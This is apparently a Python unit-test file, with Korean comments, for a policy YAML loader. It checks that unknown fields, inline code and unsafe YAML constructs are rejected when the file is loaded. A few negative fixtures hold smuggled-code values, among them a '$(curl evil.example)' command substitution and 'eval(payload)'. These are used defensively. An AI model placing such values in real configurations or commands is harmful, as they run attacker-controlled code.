"""plan Task 1.4 — policy 스키마 폐쇄 로더 테스트 (spec §3.4, plan D3).

fixture 는 전부 inline 문자열 + tempfile 로 실로더 경로에 태운다
(저장소 트리에 fixture 파일을 남기지 않는다 — 워커 scope 계약).

고정 대상:
- 4필드(trigger/when/require/failure_mode) 폐쇄 — 미지 키는 로드 시점 명시 에러
- 인라인 코드 구문(스크립트 치환·lambda·함수 호출)은 로드 시점 명시 에러
- D3 거부 구문 8종(anchor/alias/merge key/multi-document/flow style/
  block scalar/명시 tag/tab 들여쓰기) 각각 로드 시점 명시 에러 (fail-closed)
- 에러 메시지는 파일 경로 + 원인을 명시
- yaml_subset 은 Task 4.3 testing 설정 로더와 공유 — spec §5.2 스키마 형태 파싱 고정
"""
import os
import sys
import tempfile
import unittest

_PLUGIN_ROOT = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
)
if _PLUGIN_ROOT not in sys.path:
    sys.path.insert(0, _PLUGIN_ROOT)

from rein.kernel import policy  # noqa: E402
from rein.kernel import yaml_subset  # noqa: E402

_FIXTURE_NAME = "policy-under-test.yaml"

_VALID_POLICY = (
    "# 정상 fixture — 4필드 + when 중첩 매핑 + require 리스트\n"
    "trigger: tool.pre\n"
    "when:\n"
    "  tool: Bash\n"
    "require:\n"
    "  - tests_passed\n"
    "  - code_review\n"
    "failure_mode: closed\n"
)

# spec §5.2 고정 스키마 — Task 4.3 testing 설정 로더가 같은 파서를 공유한다
# (구현 단계 이관 노트 2). 매핑 값의 block sequence(매핑 항목) 파싱을 고정.
_TESTING_CONFIG = (
    "testing:\n"
    "  commands:\n"
    "    - id: unit\n"
    '      run: "pytest tests/unit"\n'
    "      tag: code\n"
    "    - id: contract\n"
    "      run: pytest tests/contract\n"
    "      tag: code\n"
)


class PolicyLoaderClosureTest(unittest.TestCase):
    def _load(self, text):
        with tempfile.TemporaryDirectory() as workdir:
            path = os.path.join(workdir, _FIXTURE_NAME)
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(text)
            return policy.load_policy_file(path)

    def _assert_load_error(self, text, *expected_fragments):
        """로드가 명시 에러로 실패하고, 메시지에 파일 경로 + 원인이 있는지."""
        with tempfile.TemporaryDirectory() as workdir:
            path = os.path.join(workdir, _FIXTURE_NAME)
            with open(path, "w", encoding="utf-8") as handle:
                handle.write(text)
            with self.assertRaises(policy.PolicyLoadError) as caught:
                policy.load_policy_file(path)
        message = str(caught.exception)
        self.assertIn(path, message, msg="에러는 파일 경로를 명시해야 한다")
        for fragment in expected_fragments:
            self.assertIn(fragment, message)
        return message

    # ── 정상 경로 ──────────────────────────────────────────────

    def test_valid_policy_loads_all_four_fields(self):
        fields = self._load(_VALID_POLICY)
        self.assertEqual(
            fields,
            {
                "trigger": "tool.pre",
                "when": {"tool": "Bash"},
                "require": ["tests_passed", "code_review"],
                "failure_mode": "closed",
            },
        )

    def test_optional_fields_default_fail_closed(self):
        fields = self._load("trigger: task.completed\n")
        self.assertEqual(fields["trigger"], "task.completed")
        self.assertEqual(fields["when"], {})
        self.assertEqual(fields["require"], [])
        # failure_mode 미선언 → fail-closed 기본값
        self.assertEqual(fields["failure_mode"], "closed")

    # ── 스키마 폐쇄 ────────────────────────────────────────────

    def test_unknown_field_is_load_time_error(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "action: allow\n",
            "unsupported policy field",
            "'action'",
        )

    def test_missing_trigger_is_load_time_error(self):
        self._assert_load_error(
            "require:\n"
            "  - code_review\n",
            "trigger",
        )

    def test_duplicate_field_is_load_time_error(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "trigger: tool.post\n",
            "duplicate",
        )

    def test_failure_mode_outside_enum_is_load_time_error(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "failure_mode: maybe\n",
            "failure_mode",
            "'maybe'",
        )

    def test_direct_decision_return_field_is_rejected(self):
        # spec §3.4 — 직접 ALLOW/BLOCK 반환 필드는 비지원
        self._assert_load_error(
            "trigger: tool.pre\n"
            "decision: ALLOW\n",
            "unsupported policy field",
            "'decision'",
        )

    # ── 인라인 코드 구문 ───────────────────────────────────────

    def test_inline_code_in_when_value_is_load_time_error(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "when:\n"
            "  command: $(curl evil.example)\n",
            "inline code",
            "when.command",
        )

    def test_inline_code_lambda_in_trigger_is_load_time_error(self):
        self._assert_load_error(
            "trigger: 'lambda event: ALLOW'\n",
            "inline code",
            "trigger",
        )

    def test_unknown_requirement_name_is_load_time_error(self):
        # plan Task 1.5 계약의 e2e 배선 — 고정 5종 밖 이름은 로드 시점 거부
        self._assert_load_error(
            "trigger: tool.pre\nrequire:\n  - custom_gate\n",
            "custom_gate",
        )

    def test_inline_code_call_in_require_is_load_time_error(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "require:\n"
            "  - eval(payload)\n",
            "inline code",
            "require",
        )

    # ── D3 거부 구문 8종 (fail-closed) ─────────────────────────

    def test_anchor_is_rejected(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "when: &shared\n"
            "  tool: Bash\n",
            "anchor",
        )

    def test_alias_is_rejected(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "when: *shared\n",
            "alias",
        )

    def test_merge_key_is_rejected(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "when:\n"
            "  <<: *shared\n",
            "merge key",
        )

    def test_multi_document_is_rejected(self):
        self._assert_load_error(
            "---\n"
            "trigger: tool.pre\n"
            "---\n"
            "trigger: task.completed\n",
            "multi-document",
        )

    def test_flow_style_mapping_is_rejected(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "when: {tool: Bash}\n",
            "flow style",
        )

    def test_flow_style_sequence_is_rejected(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "require: [code_review]\n",
            "flow style",
        )

    def test_block_scalar_literal_is_rejected(self):
        self._assert_load_error(
            "trigger: |\n"
            "  tool.pre\n",
            "block scalar",
        )

    def test_block_scalar_folded_is_rejected(self):
        self._assert_load_error(
            "trigger: >\n"
            "  tool.pre\n",
            "block scalar",
        )

    def test_explicit_tag_is_rejected(self):
        self._assert_load_error(
            "trigger: !!str tool.pre\n",
            "tag",
        )

    def test_tab_indentation_is_rejected(self):
        self._assert_load_error(
            "trigger: tool.pre\n"
            "when:\n"
            "\ttool: Bash\n",
            "tab",
        )

    # ── 디렉토리 로더 ──────────────────────────────────────────

    def test_load_policies_directory_roundtrip(self):
        with tempfile.TemporaryDirectory() as policy_dir:
            names = {
                "b-second.yaml": _VALID_POLICY,
                "a-first.yaml": "trigger: task.completed\n",
            }
            for name, text in names.items():
                with open(
                    os.path.join(policy_dir, name), "w", encoding="utf-8"
                ) as handle:
                    handle.write(text)
            # 비-yaml 파일은 policy 로 취급하지 않는다
            with open(
                os.path.join(policy_dir, "notes.txt"), "w", encoding="utf-8"
            ) as handle:
                handle.write("not a policy\n")

            loaded = policy.load_policies(policy_dir)
        self.assertEqual(
            [entry["policy_id"] for entry in loaded], ["a-first", "b-second"]
        )
        self.assertEqual(loaded[1]["fields"]["require"], [
            "tests_passed", "code_review",
        ])

    def test_load_policies_names_offending_file(self):
        with tempfile.TemporaryDirectory() as policy_dir:
            good_path = os.path.join(policy_dir, "good.yaml")
            with open(good_path, "w", encoding="utf-8") as handle:
                handle.write(_VALID_POLICY)
            bad_path = os.path.join(policy_dir, "broken.yaml")
            with open(bad_path, "w", encoding="utf-8") as handle:
                handle.write("trigger: tool.pre\nunknown_key: 1\n")
            with self.assertRaises(policy.PolicyLoadError) as caught:
                policy.load_policies(policy_dir)
            self.assertIn(bad_path, str(caught.exception))

    def test_missing_policy_dir_loads_nothing(self):
        self.assertEqual(policy.load_policies(None), [])
        self.assertEqual(policy.load_policies(""), [])


class YamlSubsetSharedContractTest(unittest.TestCase):
    """Task 4.3 testing 설정 로더와의 공유 계약 — spec §5.2 스키마 형태."""

    def test_testing_config_shape_parses(self):
        parsed = yaml_subset.parse(_TESTING_CONFIG, source="testing.yaml")
        self.assertEqual(
            parsed,
            {
                "testing": {
                    "commands": [
                        {
                            "id": "unit",
                            "run": "pytest tests/unit",
                            "tag": "code",
                        },
                        {
                            "id": "contract",
                            "run": "pytest tests/contract",
                            "tag": "code",
                        },
                    ]
                }
            },
        )

    def test_comments_and_blank_lines_are_ignored(self):
        parsed = yaml_subset.parse(
            "# 머리 주석\n"
            "\n"
            "trigger: tool.pre  # 꼬리 주석\n",
            source="inline.yaml",
        )
        self.assertEqual(parsed, {"trigger": "tool.pre"})

    def test_error_names_source_and_line(self):
        with self.assertRaises(yaml_subset.YamlSubsetError) as caught:
            yaml_subset.parse(
                "trigger: tool.pre\n"
                "when: {tool: Bash}\n",
                source="inline.yaml",
            )
        self.assertIn("inline.yaml:2", str(caught.exception))


if __name__ == "__main__":
    unittest.main()
